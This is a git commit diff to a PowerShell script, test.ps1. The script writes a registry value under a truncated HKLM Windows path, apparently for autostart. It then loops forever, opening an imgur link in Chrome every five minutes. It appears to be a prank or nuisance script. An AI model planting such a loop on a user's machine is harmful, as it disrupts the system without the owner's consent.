96374bb2accf41ef49ac19cec63361a0ae174ae5
0utDoorFr0g <63755945+0utDoorFr0g@users.noreply.github.com>
2021-01-06 21:11:45 +0900

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -2,6 +2,6 @@ Set-ItemProperty -Path "HKEY_LOCAL_MACHINE\\SOFTWARE\Microsoft\\Windows\\Current
 
 while(1 -eq 1)
 {
-  Start-Process -FilePath "%appdata%\\frog.ps1" -ArgumentList "https://imgur.com/RS2OVJf";
+  Start-Process -FilePath "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" -ArgumentList "https://imgur.com/RS2OVJf";
   Start-Sleep -s 300;
 }
